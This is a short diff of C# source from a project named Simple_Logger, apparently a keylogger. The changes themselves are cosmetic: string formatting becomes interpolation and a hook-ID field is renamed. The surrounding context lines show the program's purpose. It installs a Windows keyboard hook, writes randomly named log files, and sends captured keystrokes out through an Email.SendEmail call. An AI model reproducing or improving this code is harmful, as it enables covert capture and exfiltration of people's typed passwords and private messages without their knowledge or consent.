@@ -55,7 +55,7 @@ namespace Simple_Logger
 
             var logFile = Path.GetRandomFileName();
 
-            var filePath = String.Format(folderPath + "\\{0}", logFile);
+            var filePath = $"{folderPath}\\{logFile}";
 
             if (!File.Exists(filePath))
             {
@@ -66,7 +66,7 @@ namespace Simple_Logger
             {
                 logFile = Path.GetRandomFileName();
 
-                filePath = String.Format(folderPath + "\\{0}", logFile);
+                filePath = $"{folderPath}\\{logFile}";
 
                 File.Create(filePath).Close();
             }
@@ -105,10 +105,10 @@ namespace Simple_Logger
                 Email.SendEmail(keystrokes);
             });
 
-            Hook._hookId = Hook.SetHook(Hook.Proc);
+            Hook.HookId = Hook.SetHook(Hook.Proc);
             Application.Run();
 
-            Hook.UnhookWindowsHookEx(Hook._hookId);
+            Hook.UnhookWindowsHookEx(Hook.HookId);
 
         }
 
